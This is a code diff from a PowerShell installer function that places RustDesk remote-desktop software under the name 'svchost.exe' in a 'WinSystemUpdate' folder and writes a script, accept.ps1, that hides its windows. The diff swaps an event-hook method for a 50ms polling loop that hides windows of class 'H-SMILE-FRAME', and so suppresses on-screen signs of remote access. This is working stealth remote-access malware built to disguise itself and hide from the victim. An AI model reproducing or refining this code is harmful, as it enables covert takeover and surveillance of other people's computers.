@@ -81,80 +81,43 @@ function Install-RD {
         $RDID = $outT2.Result.Trim()
     }
 
-    # 6. Write accept.ps1 — uses WinEventHook EVENT_OBJECT_SHOW to hide BEFORE render
+    # 6. Write accept.ps1 — 50ms poll loop, hides by window class H-SMILE-FRAME
     $acceptPs = "$DEST\accept.ps1"
     Set-Content $acceptPs @'
 Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
-public class WEH {
-    public delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType,
-        IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
-
-    [DllImport("user32.dll")] public static extern IntPtr SetWinEventHook(
-        uint eventMin, uint eventMax, IntPtr hmodWinEventProc,
-        WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
-    [DllImport("user32.dll")] public static extern bool UnhookWinEvent(IntPtr h);
+using System; using System.Runtime.InteropServices; using System.Text;
+public class WH2 {
+    [DllImport("user32.dll")] public static extern bool EnumWindows(EWP p, IntPtr l);
     [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
+    [DllImport("user32.dll")] public static extern int GetClassName(IntPtr h, StringBuilder s, int n);
+    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
     [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
     [DllImport("user32.dll")] public static extern int GetWindowTextLength(IntPtr h);
-    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
-    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);
-    [DllImport("user32.dll")] public static extern bool IsWindowVisible(IntPtr h);
-    [DllImport("user32.dll")] public static extern int GetMessage(out MSG m, IntPtr h, uint f, uint l);
-    [DllImport("user32.dll")] public static extern bool TranslateMessage(ref MSG m);
-    [DllImport("user32.dll")] public static extern IntPtr DispatchMessage(ref MSG m);
-    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int L,T,R,B; }
-    [StructLayout(LayoutKind.Sequential)] public struct MSG {
-        public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam;
-        public uint time; public int ptX; public int ptY;
-    }
-    public const uint EVENT_OBJECT_SHOW    = 0x8002;
-    public const uint EVENT_OBJECT_CREATE  = 0x8000;
-    public const uint WINEVENT_OUTOFCONTEXT = 0x0000;
+    public delegate bool EWP(IntPtr h, IntPtr l);
 }
 "@
-$DEST  = "$env:LOCALAPPDATA\WinSystemUpdate"
+$DEST    = "$env:LOCALAPPDATA\WinSystemUpdate"
 $exePath = "$DEST\svchost.exe"
-
-# Get RustDesk PID (wait for it to start)
-$rdPid = 0
-for($i=0;$i -lt 20;$i++){
-    $pr = Get-Process svchost -EA SilentlyContinue | Where-Object{$_.Path -eq $exePath} | Select-Object -First 1
-    if($pr){ $rdPid = $pr.Id; break }
-    Start-Sleep -Milliseconds 500
-}
-if($rdPid -eq 0){ exit }
-
-$hook = $null
-$cb = [WEH+WinEventDelegate]{
-    param($hHook,$evType,$hwnd,$idObj,$idChild,$tid,$time)
-    if($hwnd -eq [IntPtr]::Zero){ return }
-    $p2=0; [WEH]::GetWindowThreadProcessId($hwnd,[ref]$p2) | Out-Null
-    if($p2 -ne $script:rdPid){ return }
-    # Hide immediately — before any paint
-    [WEH]::ShowWindow($hwnd, 0) | Out-Null
-}
-
-# Hook EVENT_OBJECT_CREATE and EVENT_OBJECT_SHOW for our process
-$hook = [WEH]::SetWinEventHook(
-    [WEH]::EVENT_OBJECT_CREATE, [WEH]::EVENT_OBJECT_SHOW,
-    [IntPtr]::Zero, $cb, $rdPid, 0, [WEH]::WINEVENT_OUTOFCONTEXT)
-
-# Message pump — required for WinEventHook callbacks to fire
-$msg = New-Object WEH+MSG
 while($true){
-    $pr2 = Get-Process svchost -EA SilentlyContinue | Where-Object{$_.Path -eq $exePath}
-    if(-not $pr2){ break }
-    # Pump messages (non-blocking)
-    $r = [WEH]::GetMessage([ref]$msg,[IntPtr]::Zero,0,0)
-    if($r -le 0){ break }
-    [WEH]::TranslateMessage([ref]$msg) | Out-Null
-    [WEH]::DispatchMessage([ref]$msg) | Out-Null
+    Start-Sleep -Milliseconds 50
+    $rdPids = @()
+    Get-Process svchost -EA SilentlyContinue | Where-Object{$_.Path -eq $exePath} | ForEach-Object{$rdPids += $_.Id}
+    if($rdPids.Count -eq 0){ break }
+    [WH2]::EnumWindows({
+        param($h,$l)
+        $p2=0; [WH2]::GetWindowThreadProcessId($h,[ref]$p2)|Out-Null
+        if($p2 -notin $script:rdPids){ return $true }
+        $csb=New-Object System.Text.StringBuilder(64); [WH2]::GetClassName($h,$csb,64)|Out-Null
+        if($csb.ToString() -eq "H-SMILE-FRAME"){
+            $tsb=New-Object System.Text.StringBuilder(64); [WH2]::GetWindowText($h,$tsb,64)|Out-Null
+            $t=$tsb.ToString()
+            if($t -ne "Chrome" -and $t -ne ""){
+                [WH2]::ShowWindow($h,0)|Out-Null
+            }
+        }
+        return $true
+    },[IntPtr]::Zero)|Out-Null
 }
-if($hook){ [WEH]::UnhookWinEvent($hook) | Out-Null }
 '@ -Encoding UTF8
 
     # 7. Launch hidden
